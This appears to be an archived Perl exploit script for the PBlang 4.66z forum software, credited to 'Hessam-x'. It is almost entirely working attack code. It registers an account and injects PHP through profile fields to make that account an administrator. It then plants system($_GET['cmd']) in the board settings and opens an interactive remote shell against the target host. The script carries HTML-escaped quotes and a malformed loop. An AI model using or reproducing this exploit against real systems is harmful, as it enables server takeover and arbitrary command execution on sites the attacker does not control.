PBlang 4.66z Remote Code Execution Exploit
==========================================



#!/usr/bin/perl
# PBlang 4.66z Remote Command Execution Exploit
# this Exploit *register* a user with admin access
# - magic_quotes_gpc = Off
# - Only work on 4.66z

use IO::Socket;
use LWP::UserAgent;
use HTTP::Cookies;


 $host = $ARGV[0];
 $uname = $ARGV[1];
 $passwd = $ARGV[2];
 $url = "http://".$host;

 print q(
 ###########################################################
 #      PBLANG 4.66z Remote Command Execution Exploit      #
 #                    www.Hessamx.Net                      #
 ################# (C)oded By Hessam-x #####################

);



 if (@ARGV < 3) {
 print " #  usage : xpl.pl [host&path] [uname] [pass]\n";
 print " #  e.g : xpl.pl www.site.com/pblang/ username 123456\n";
 exit();
 }

   print " [~] User/Password : $uname/$passwd \n";
   print " [~] Host : $host \n";

 $evilcode  = " \$userlocation=\"hell\"; \$userjoined=\"1174733561\"; \$userhomepage=\"http://\";";
 $evilcode .= " \$useradmin=\"1\"; \$usermod=\"0\"; \$userban=\"0\"; \$userlastvisit=\"1174733561\";";

 $xpl = LWP::UserAgent->new() or die;
 $cookie_jar = HTTP::Cookies->new();

 $xpl->cookie_jar( $cookie_jar );

   #register
 $reg = $xpl->post($url.&#039;register.php?reg=2&#039;,
 Content => [
 "user" => $uname,
 "pass" => $passwd,
 "pass2" => $passwd,
 "em" => &#039;evil@hell.com&#039;,
 "realname" => &#039;evilcode&#039;,
 "alias" => $uname,
 "msn" => &#039;evilcode&#039;,
 "icq" => &#039;evilcode&#039;,
 "aim" => &#039;evilcode&#039;,
 "yahoo" => &#039;evilcode&#039;,
 "qq" => &#039;evilcode&#039;,
 "web" => &#039;http://&#039;,
 "loc" => &#039;hell&#039;,
 "pt" => &#039;PBLang&#039;,
 "av" => &#039;none&#039;,
 "webav" =>&#039;&#039;,
 "sig" => &#039;be Safe&#039;,
 "regcode" => &#039;9999999999&#039;,
 "lang" => &#039;en&#039;,
 "accept" => &#039;1&#039;,
 "Submit" => &#039;Submit&#039;,
 ],);
   print " [~] registered ... \n";

$login = $xpl->post($url.&#039;login.php?id=2&#039;,
Content => [
&#039;user&#039; => $uname,
&#039;pass&#039; => $passwd,
&#039;Submit&#039; => &#039;submit&#039;,
],);
$setcookie = $xpl->post($url.&#039;setcookie.php?u=&#039;.$uname);
 if($cookie_jar->as_string =~ /$uname/) {
   print " [~] Logined ... \n";
 } else {
 print " [-] Can not Login In $host !\n";
 exit();
 }
 $ecode = $xpl->post($url.&#039;ucp.php?id=2&user=&#039;.$uname,
 Content => [
 "npass" => $passwd,
 "npass2" => $passwd,
 "oldpass" => $passwd,
 "emhide" => &#039;hide&#039;,
 "user" => $uname,
 "em" => &#039;evil@hell.com&#039;,
 "realname" => &#039;evilcode&#039;,
 "alias" => $uname,
 "msn" => &#039;evilcode&#039;,
 "icq" => &#039;evilcode&#039;,
 "aim" => &#039;evilcode\";&#039;.$evilcode,
 "yah" => &#039;evilcode&#039;,
 "qq" => &#039;evilcode&#039;,
 "web" => &#039;http://&#039;,
 "loc" => &#039;hell&#039;,
 "pt" => &#039;PBLang&#039;,
 "av" => &#039;none&#039;,
 "webav" =>&#039;&#039;,
 "sig" => &#039;&#039;,
 "regcode" => &#039;1174733482&#039;,
 "ulang" => &#039;*/ \$userlang=\"en\"; //&#039;,
 "accept" => &#039;1&#039;,
 "Submit2" => &#039;Submit&#039;,
 ],);
print " [+] change access to admin \n";
$syscode = "system(\$_GET[\&#039;cmd\&#039;]); echo _END_ ; //";
$cmd  = &#039;echo 1 ; echo _START_ ; &#039;.$syscode;
 $codesys = $xpl->post($url.&#039;admin2.php?do=fsettings2&#039;,
 Content => [
"title" => &#039;Welcome&#039;,
"charsets" => &#039;Ciso-8859-15&#039;,
"motto" => &#039;s&#039;, "bbgimage" => &#039;2"; &#039;.$cmd, "boardwidth" => &#039;100&#039;, "boardalign" => &#039;center&#039;,
"frameset" => &#039;_self&#039;, "maxposts" => &#039;10&#039;, "maxppp" => &#039;25&#039;, "maxrpp" => &#039;10&#039;, "maxlatest" => &#039;10&#039;,
"textareawidth" => &#039;60&#039;, "allowem" => &#039;1&#039;, "notifyadm" => &#039;1&#039;, "notifyadmrepl" => &#039;1&#039;,
"language" => &#039;en&#039;, "timezone" => &#039;0&#039;, "mr" => &#039;Sorry&#039;, "banreason" => &#039;Access+is+denied&#039;,
"defslogan" => &#039;PBLang++is+super&#039;, "adminemail" => &#039;evil@hell.foo&#039;,
"emsupp" => &#039;1&#039;, "smtpmail" => &#039;0&#039;, "welcmess" => &#039;&#039;, "allalias" => &#039;1&#039;,"chalias" => &#039;21&#039;,
"av" => &#039;1&#039;,"webav" => &#039;1&#039;, "avmaxwidth" => &#039;100&#039;, "avmaxheight" => &#039;60&#039;, "noatch" => &#039;1&#039;,
"attachtypes" => &#039;txt&#039;, "maxatchsize" => &#039;20000&#039;,
"minspace" => &#039;10000000&#039;, "bbcode" => &#039;1&#039;, "smilys" => &#039;1&#039;, "allowreg" => &#039;1&#039;, "chckip" => &#039;1&#039; ,"Submit" => &#039;Submit&#039;,
 ],);

   while ()
{
     print "\n[Shell]\$ ";
     chomp($exc=<STDIN>);
    &sys($exc);
}
sub sys($exc) {
     if ($exc eq &#039;exit&#039;) { exit() ; }
 $res = $xpl->get($url.&#039;index.php?cmd=&#039;.$exc);
 @result = split(/\n/,$res->content);
 $runned = 0;
 $on = 0;
 for $res(@result) {
   if ($res =~ /^_END_/) { print "\n"; return 0; }
   if ($on == 0) { print "  $res\n"; }
   if ($res =~ /^_START_/) { $on = 1; $runned = 1; }
 }
   if (!$runned) { print "\n Can not execute command . EXPLOIT FAILED !\n" ; exit(); };

 }

print "\n #################################################### \n";



